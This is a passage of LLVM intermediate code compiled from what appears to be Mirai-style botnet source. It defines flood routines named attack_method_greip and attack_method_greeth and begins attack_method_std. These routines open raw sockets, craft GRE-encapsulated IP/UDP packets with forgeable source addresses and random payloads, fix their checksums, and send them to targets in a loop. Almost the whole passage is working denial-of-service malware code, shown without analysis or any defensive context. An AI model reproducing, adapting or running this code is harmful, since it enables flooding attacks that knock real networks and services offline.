; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %195, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #10
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %48, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = sext i32 %21 to i64
  %37 = add nsw i64 %36, 52
  %38 = trunc i64 %37 to i16
  %39 = icmp ne i8 %16, 0
  %40 = add nsw i64 %36, 28
  %41 = trunc i64 %40 to i16
  %42 = xor i16 %12, -1
  %43 = icmp eq i8 %25, 0
  %44 = add nsw i64 %36, 8
  %45 = trunc i64 %44 to i16
  %.promoted = load i32, i32* %5, align 4
  %46 = sext i32 %.promoted to i64
  %47 = zext i8 %0 to i64
  br label %64

; <label>:48:                                     ; preds = %30
  %49 = call i32 @close(i32 %28) #10
  br label %195

..preheader_crit_edge:                            ; preds = %108
  %50 = trunc i64 %indvars.iv.next to i32
  store i32 %50, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader125, %..preheader_crit_edge
  %51 = icmp eq i8 %0, 0
  %52 = icmp eq i32 %27, -1
  %53 = and i32 %11, 65535
  %54 = icmp eq i32 %53, 65535
  %55 = and i32 %17, 65535
  %56 = icmp eq i32 %55, 65535
  %57 = and i32 %19, 65535
  %58 = icmp eq i32 %57, 65535
  %59 = icmp eq i8 %25, 0
  %60 = icmp eq i8 %23, 0
  %61 = sext i32 %21 to i64
  %62 = add i32 %21, 8
  %63 = add nsw i64 %61, 52
  br label %.loopexit

; <label>:64:                                     ; preds = %.lr.ph127, %108
  %indvars.iv = phi i64 [ %46, %.lr.ph127 ], [ %indvars.iv.next, %108 ]
  %65 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %66 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %65, i8** %66, align 8
  %67 = getelementptr inbounds i8, i8* %65, i64 24
  %68 = getelementptr inbounds i8, i8* %65, i64 44
  store i8 69, i8* %65, align 4
  %69 = getelementptr inbounds i8, i8* %65, i64 1
  store i8 %10, i8* %69, align 1
  %70 = call zeroext i16 @htons(i16 zeroext %38) #11
  %71 = getelementptr inbounds i8, i8* %65, i64 2
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext %12) #11
  %74 = getelementptr inbounds i8, i8* %65, i64 4
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 4
  %76 = getelementptr inbounds i8, i8* %65, i64 8
  store i8 %14, i8* %76, align 4
  br i1 %39, label %77, label %81

; <label>:77:                                     ; preds = %64
  %78 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %79 = getelementptr inbounds i8, i8* %65, i64 6
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  br label %81

; <label>:81:                                     ; preds = %77, %64
  %82 = getelementptr inbounds i8, i8* %65, i64 9
  store i8 47, i8* %82, align 1
  %83 = getelementptr inbounds i8, i8* %65, i64 12
  %84 = bitcast i8* %83 to i32*
  store i32 %27, i32* %84, align 4
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %86 = load i32, i32* %85, align 4
  %87 = getelementptr inbounds i8, i8* %65, i64 16
  %88 = bitcast i8* %87 to i32*
  store i32 %86, i32* %88, align 4
  %89 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %90 = getelementptr inbounds i8, i8* %65, i64 22
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  store i8 69, i8* %67, align 4
  %92 = getelementptr inbounds i8, i8* %65, i64 25
  store i8 %10, i8* %92, align 1
  %93 = call zeroext i16 @htons(i16 zeroext %41) #11
  %94 = getelementptr inbounds i8, i8* %65, i64 26
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  %96 = call zeroext i16 @htons(i16 zeroext %42) #11
  %97 = getelementptr inbounds i8, i8* %65, i64 28
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 4
  %99 = getelementptr inbounds i8, i8* %65, i64 32
  store i8 %14, i8* %99, align 4
  br i1 %39, label %100, label %104

; <label>:100:                                    ; preds = %81
  %101 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %102 = getelementptr inbounds i8, i8* %65, i64 30
  %103 = bitcast i8* %102 to i16*
  store i16 %101, i16* %103, align 2
  br label %104

; <label>:104:                                    ; preds = %100, %81
  %105 = getelementptr inbounds i8, i8* %65, i64 33
  store i8 17, i8* %105, align 1
  br i1 %43, label %108, label %106

; <label>:106:                                    ; preds = %104
  %107 = load i32, i32* %88, align 4
  br label %108

; <label>:108:                                    ; preds = %104, %106
  %.sink = phi i32 [ %107, %106 ], [ 1023, %104 ]
  %109 = getelementptr inbounds i8, i8* %65, i64 40
  %110 = bitcast i8* %109 to i32*
  store i32 %.sink, i32* %110, align 4
  %111 = call zeroext i16 @htons(i16 zeroext %18) #11
  %112 = bitcast i8* %68 to i16*
  store i16 %111, i16* %112, align 2
  %113 = call zeroext i16 @htons(i16 zeroext %20) #11
  %114 = getelementptr inbounds i8, i8* %65, i64 46
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call zeroext i16 @htons(i16 zeroext %45) #11
  %117 = getelementptr inbounds i8, i8* %65, i64 48
  %118 = bitcast i8* %117 to i16*
  store i16 %116, i16* %118, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %119 = icmp slt i64 %indvars.iv.next, %47
  br i1 %119, label %64, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %163
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %51, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %163
  %storemerge124126 = phi i32 [ %193, %163 ], [ 0, %.lr.ph.preheader ]
  %120 = sext i32 %storemerge124126 to i64
  %121 = getelementptr inbounds i8*, i8** %8, i64 %120
  %122 = load i8*, i8** %121, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 24
  %124 = bitcast i8* %123 to %struct.iphdr*
  %125 = getelementptr inbounds i8, i8* %122, i64 44
  %126 = getelementptr inbounds i8, i8* %122, i64 52
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %120, i32 2
  %128 = load i8, i8* %127, align 4
  %129 = icmp ult i8 %128, 32
  br i1 %129, label %130, label %137

; <label>:130:                                    ; preds = %.lr.ph
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %120, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = call i32 @ntohl(i32 %132) #11
  %134 = call i32 @htonl(i32 %133) #11
  %135 = getelementptr inbounds i8, i8* %122, i64 16
  %136 = bitcast i8* %135 to i32*
  store i32 %134, i32* %136, align 4
  br label %137

; <label>:137:                                    ; preds = %130, %.lr.ph
  br i1 %52, label %138, label %141

; <label>:138:                                    ; preds = %137
  %139 = getelementptr inbounds i8, i8* %122, i64 12
  %140 = bitcast i8* %139 to i32*
  store i32 0, i32* %140, align 4
  br label %141

; <label>:141:                                    ; preds = %138, %137
  br i1 %54, label %142, label %147

; <label>:142:                                    ; preds = %141
  %143 = getelementptr inbounds i8, i8* %122, i64 4
  %144 = bitcast i8* %143 to i16*
  store i16 0, i16* %144, align 4
  %145 = getelementptr inbounds i8, i8* %122, i64 28
  %146 = bitcast i8* %145 to i16*
  store i16 999, i16* %146, align 4
  br label %147

; <label>:147:                                    ; preds = %142, %141
  br i1 %56, label %148, label %150

; <label>:148:                                    ; preds = %147
  %149 = bitcast i8* %125 to i16*
  store i16 0, i16* %149, align 2
  br label %150

; <label>:150:                                    ; preds = %148, %147
  br i1 %58, label %151, label %154

; <label>:151:                                    ; preds = %150
  %152 = getelementptr inbounds i8, i8* %122, i64 46
  %153 = bitcast i8* %152 to i16*
  store i16 0, i16* %153, align 2
  br label %154

; <label>:154:                                    ; preds = %151, %150
  br i1 %59, label %159, label %155

; <label>:155:                                    ; preds = %154
  %156 = getelementptr inbounds i8, i8* %122, i64 16
  %157 = bitcast i8* %156 to i32*
  %158 = load i32, i32* %157, align 4
  br label %159

; <label>:159:                                    ; preds = %154, %155
  %.sink3 = phi i32 [ %158, %155 ], [ 0, %154 ]
  %160 = getelementptr inbounds i8, i8* %122, i64 40
  %161 = bitcast i8* %160 to i32*
  store i32 %.sink3, i32* %161, align 4
  br i1 %60, label %163, label %162

; <label>:162:                                    ; preds = %159
  call void @rand_str(i8* nonnull %126, i32 %21)
  br label %163

; <label>:163:                                    ; preds = %159, %162
  %164 = getelementptr inbounds i8, i8* %122, i64 10
  %165 = bitcast i8* %164 to i16*
  store i16 0, i16* %165, align 2
  %166 = bitcast i8* %122 to i16*
  %167 = call zeroext i16 @checksum_generic(i16* %166, i32 20)
  store i16 %167, i16* %165, align 2
  %168 = getelementptr inbounds i8, i8* %122, i64 34
  %169 = bitcast i8* %168 to i16*
  store i16 0, i16* %169, align 2
  %170 = bitcast i8* %123 to i16*
  %171 = call zeroext i16 @checksum_generic(i16* %170, i32 20)
  store i16 %171, i16* %169, align 2
  %172 = getelementptr inbounds i8, i8* %122, i64 50
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = getelementptr inbounds i8, i8* %122, i64 48
  %175 = bitcast i8* %174 to i16*
  %176 = load i16, i16* %175, align 2
  %177 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %124, i8* nonnull %125, i16 zeroext %176, i32 %62)
  store i16 %177, i16* %173, align 2
  %178 = load i32, i32* %5, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %179, i32 0, i32 0
  store i16 2, i16* %180, align 4
  %181 = getelementptr inbounds i8, i8* %122, i64 16
  %182 = bitcast i8* %181 to i32*
  %183 = load i32, i32* %182, align 4
  %184 = load i32, i32* %5, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %185, i32 0, i32 2, i32 0
  store i32 %183, i32* %186, align 4
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %185, i32 0, i32 1
  store i16 0, i16* %187, align 2
  %188 = sext i32 %184 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %188, i32 0
  %190 = bitcast %struct.sockaddr_in* %189 to %struct.sockaddr*
  %191 = call i64 @sendto(i32 %28, i8* nonnull %122, i64 %63, i32 16384, %struct.sockaddr* %190, i32 16) #10
  %192 = load i32, i32* %5, align 4
  %193 = add nsw i32 %192, 1
  store i32 %193, i32* %5, align 4
  %194 = icmp slt i32 %193, %34
  br i1 %194, label %.lr.ph, label %.loopexit.loopexit

; <label>:195:                                    ; preds = %4, %48
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = zext i8 %0 to i64
  %10 = tail call noalias i8* @calloc(i64 %9, i64 8) #10
  %11 = bitcast i8* %10 to i8**
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %19 = trunc i32 %18 to i8
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %26 = trunc i32 %25 to i8
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = load i32, i32* @LOCAL_ADDR, align 4
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %29)
  %31 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %209, label %33

; <label>:33:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %34 = bitcast i32* %5 to i8*
  %35 = call i32 @setsockopt(i32 %31, i32 0, i32 3, i8* nonnull %34, i32 4) #10
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %51, label %.preheader132

.preheader132:                                    ; preds = %33
  store i32 0, i32* %5, align 4
  %37 = zext i8 %0 to i32
  %38 = icmp eq i8 %0, 0
  br i1 %38, label %.preheader, label %.lr.ph134

.lr.ph134:                                        ; preds = %.preheader132
  %39 = sext i32 %24 to i64
  %40 = add nsw i64 %39, 66
  %41 = trunc i64 %40 to i16
  %42 = icmp ne i8 %19, 0
  %43 = add nsw i64 %39, 28
  %44 = trunc i64 %43 to i16
  %45 = xor i16 %15, -1
  %46 = icmp eq i8 %28, 0
  %47 = add nsw i64 %39, 8
  %48 = trunc i64 %47 to i16
  %.promoted = load i32, i32* %5, align 4
  %49 = sext i32 %.promoted to i64
  %50 = zext i8 %0 to i64
  br label %71

; <label>:51:                                     ; preds = %33
  %52 = call i32 @close(i32 %31) #10
  br label %209

..preheader_crit_edge:                            ; preds = %118
  %53 = trunc i64 %indvars.iv.next to i32
  store i32 %53, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader132, %..preheader_crit_edge
  %54 = icmp eq i8 %0, 0
  %55 = icmp eq i32 %30, -1
  %56 = and i32 %14, 65535
  %57 = icmp eq i32 %56, 65535
  %58 = and i32 %20, 65535
  %59 = icmp eq i32 %58, 65535
  %60 = and i32 %22, 65535
  %61 = icmp eq i32 %60, 65535
  %62 = icmp eq i8 %28, 0
  %63 = bitcast i32* %6 to i8*
  %64 = bitcast i32* %7 to i8*
  %65 = bitcast i32* %8 to i8*
  %66 = getelementptr inbounds i8, i8* %65, i64 2
  %67 = icmp eq i8 %26, 0
  %68 = sext i32 %24 to i64
  %69 = add i32 %24, 8
  %70 = add nsw i64 %68, 66
  br label %.loopexit

; <label>:71:                                     ; preds = %.lr.ph134, %118
  %indvars.iv = phi i64 [ %49, %.lr.ph134 ], [ %indvars.iv.next, %118 ]
  %72 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %73 = getelementptr inbounds i8*, i8** %11, i64 %indvars.iv
  store i8* %72, i8** %73, align 8
  %74 = getelementptr inbounds i8, i8* %72, i64 38
  %75 = getelementptr inbounds i8, i8* %72, i64 58
  store i8 69, i8* %72, align 4
  %76 = getelementptr inbounds i8, i8* %72, i64 1
  store i8 %13, i8* %76, align 1
  %77 = call zeroext i16 @htons(i16 zeroext %41) #11
  %78 = getelementptr inbounds i8, i8* %72, i64 2
  %79 = bitcast i8* %78 to i16*
  store i16 %77, i16* %79, align 2
  %80 = call zeroext i16 @htons(i16 zeroext %15) #11
  %81 = getelementptr inbounds i8, i8* %72, i64 4
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 4
  %83 = getelementptr inbounds i8, i8* %72, i64 8
  store i8 %17, i8* %83, align 4
  br i1 %42, label %84, label %88

; <label>:84:                                     ; preds = %71
  %85 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %86 = getelementptr inbounds i8, i8* %72, i64 6
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  br label %88

; <label>:88:                                     ; preds = %84, %71
  %89 = getelementptr inbounds i8, i8* %72, i64 9
  store i8 47, i8* %89, align 1
  %90 = getelementptr inbounds i8, i8* %72, i64 12
  %91 = bitcast i8* %90 to i32*
  store i32 %30, i32* %91, align 4
  %92 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %93 = load i32, i32* %92, align 4
  %94 = getelementptr inbounds i8, i8* %72, i64 16
  %95 = bitcast i8* %94 to i32*
  store i32 %93, i32* %95, align 4
  %96 = call zeroext i16 @htons(i16 zeroext 25944) #11
  %97 = getelementptr inbounds i8, i8* %72, i64 22
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %100 = getelementptr inbounds i8, i8* %72, i64 36
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 1
  store i8 69, i8* %74, align 4
  %102 = getelementptr inbounds i8, i8* %72, i64 39
  store i8 %13, i8* %102, align 1
  %103 = call zeroext i16 @htons(i16 zeroext %44) #11
  %104 = getelementptr inbounds i8, i8* %72, i64 40
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = call zeroext i16 @htons(i16 zeroext %45) #11
  %107 = getelementptr inbounds i8, i8* %72, i64 42
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 4
  %109 = getelementptr inbounds i8, i8* %72, i64 46
  store i8 %17, i8* %109, align 4
  br i1 %42, label %110, label %114

; <label>:110:                                    ; preds = %88
  %111 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %112 = getelementptr inbounds i8, i8* %72, i64 44
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 2
  br label %114

; <label>:114:                                    ; preds = %110, %88
  %115 = getelementptr inbounds i8, i8* %72, i64 47
  store i8 17, i8* %115, align 1
  br i1 %46, label %118, label %116

; <label>:116:                                    ; preds = %114
  %117 = load i32, i32* %95, align 4
  br label %118

; <label>:118:                                    ; preds = %114, %116
  %.sink = phi i32 [ %117, %116 ], [ 1023, %114 ]
  %119 = getelementptr inbounds i8, i8* %72, i64 54
  %120 = bitcast i8* %119 to i32*
  store i32 %.sink, i32* %120, align 4
  %121 = call zeroext i16 @htons(i16 zeroext %21) #11
  %122 = bitcast i8* %75 to i16*
  store i16 %121, i16* %122, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %23) #11
  %124 = getelementptr inbounds i8, i8* %72, i64 60
  %125 = bitcast i8* %124 to i16*
  store i16 %123, i16* %125, align 2
  %126 = call zeroext i16 @htons(i16 zeroext %48) #11
  %127 = getelementptr inbounds i8, i8* %72, i64 62
  %128 = bitcast i8* %127 to i16*
  store i16 %126, i16* %128, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %129 = icmp slt i64 %indvars.iv.next, %50
  br i1 %129, label %71, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %177
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %54, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %177
  %storemerge131133 = phi i32 [ %207, %177 ], [ 0, %.lr.ph.preheader ]
  %130 = sext i32 %storemerge131133 to i64
  %131 = getelementptr inbounds i8*, i8** %11, i64 %130
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr inbounds i8, i8* %132, i64 24
  %134 = getelementptr inbounds i8, i8* %132, i64 38
  %135 = bitcast i8* %134 to %struct.iphdr*
  %136 = getelementptr inbounds i8, i8* %132, i64 58
  %137 = getelementptr inbounds i8, i8* %132, i64 66
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %130, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = icmp ult i8 %139, 32
  br i1 %140, label %141, label %148

; <label>:141:                                    ; preds = %.lr.ph
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %130, i32 1
  %143 = load i32, i32* %142, align 4
  %144 = call i32 @ntohl(i32 %143) #11
  %145 = call i32 @htonl(i32 %144) #11
  %146 = getelementptr inbounds i8, i8* %132, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %141, %.lr.ph
  br i1 %55, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %132, i64 12
  %151 = bitcast i8* %150 to i32*
  store i32 0, i32* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %57, label %153, label %158

; <label>:153:                                    ; preds = %152
  %154 = getelementptr inbounds i8, i8* %132, i64 4
  %155 = bitcast i8* %154 to i16*
  store i16 0, i16* %155, align 4
  %156 = getelementptr inbounds i8, i8* %132, i64 42
  %157 = bitcast i8* %156 to i16*
  store i16 999, i16* %157, align 4
  br label %158

; <label>:158:                                    ; preds = %153, %152
  br i1 %59, label %159, label %161

; <label>:159:                                    ; preds = %158
  %160 = bitcast i8* %136 to i16*
  store i16 0, i16* %160, align 2
  br label %161

; <label>:161:                                    ; preds = %159, %158
  br i1 %61, label %162, label %165

; <label>:162:                                    ; preds = %161
  %163 = getelementptr inbounds i8, i8* %132, i64 60
  %164 = bitcast i8* %163 to i16*
  store i16 0, i16* %164, align 2
  br label %165

; <label>:165:                                    ; preds = %162, %161
  br i1 %62, label %170, label %166

; <label>:166:                                    ; preds = %165
  %167 = getelementptr inbounds i8, i8* %132, i64 16
  %168 = bitcast i8* %167 to i32*
  %169 = load i32, i32* %168, align 4
  br label %170

; <label>:170:                                    ; preds = %165, %166
  %.sink3 = phi i32 [ %169, %166 ], [ 0, %165 ]
  %171 = getelementptr inbounds i8, i8* %132, i64 54
  %172 = bitcast i8* %171 to i32*
  store i32 %.sink3, i32* %172, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  call void @util_memcpy(i8* %133, i8* nonnull %63, i32 4) #10
  %173 = getelementptr inbounds i8, i8* %132, i64 30
  call void @util_memcpy(i8* %173, i8* nonnull %64, i32 4) #10
  %174 = getelementptr inbounds i8, i8* %132, i64 28
  call void @util_memcpy(i8* %174, i8* nonnull %65, i32 2) #10
  %175 = getelementptr inbounds i8, i8* %132, i64 34
  call void @util_memcpy(i8* %175, i8* %66, i32 2) #10
  br i1 %67, label %177, label %176

; <label>:176:                                    ; preds = %170
  call void @rand_str(i8* nonnull %137, i32 %24)
  br label %177

; <label>:177:                                    ; preds = %170, %176
  %178 = getelementptr inbounds i8, i8* %132, i64 10
  %179 = bitcast i8* %178 to i16*
  store i16 0, i16* %179, align 2
  %180 = bitcast i8* %132 to i16*
  %181 = call zeroext i16 @checksum_generic(i16* %180, i32 20)
  store i16 %181, i16* %179, align 2
  %182 = getelementptr inbounds i8, i8* %132, i64 48
  %183 = bitcast i8* %182 to i16*
  store i16 0, i16* %183, align 2
  %184 = bitcast i8* %134 to i16*
  %185 = call zeroext i16 @checksum_generic(i16* %184, i32 20)
  store i16 %185, i16* %183, align 2
  %186 = getelementptr inbounds i8, i8* %132, i64 64
  %187 = bitcast i8* %186 to i16*
  store i16 0, i16* %187, align 2
  %188 = getelementptr inbounds i8, i8* %132, i64 62
  %189 = bitcast i8* %188 to i16*
  %190 = load i16, i16* %189, align 2
  %191 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %135, i8* nonnull %136, i16 zeroext %190, i32 %69)
  store i16 %191, i16* %187, align 2
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %193, i32 0, i32 0
  store i16 2, i16* %194, align 4
  %195 = getelementptr inbounds i8, i8* %132, i64 16
  %196 = bitcast i8* %195 to i32*
  %197 = load i32, i32* %196, align 4
  %198 = load i32, i32* %5, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %199, i32 0, i32 2, i32 0
  store i32 %197, i32* %200, align 4
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %199, i32 0, i32 1
  store i16 0, i16* %201, align 2
  %202 = sext i32 %198 to i64
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %202, i32 0
  %204 = bitcast %struct.sockaddr_in* %203 to %struct.sockaddr*
  %205 = call i64 @sendto(i32 %31, i8* nonnull %132, i64 %70, i32 16384, %struct.sockaddr* %204, i32 16) #10
  %206 = load i32, i32* %5, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %5, align 4
  %208 = icmp slt i32 %207, %37
  br i1 %208, label %.lr.ph, label %.loopexit.loopexit

; <label>:209:                                    ; preds = %4, %51
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
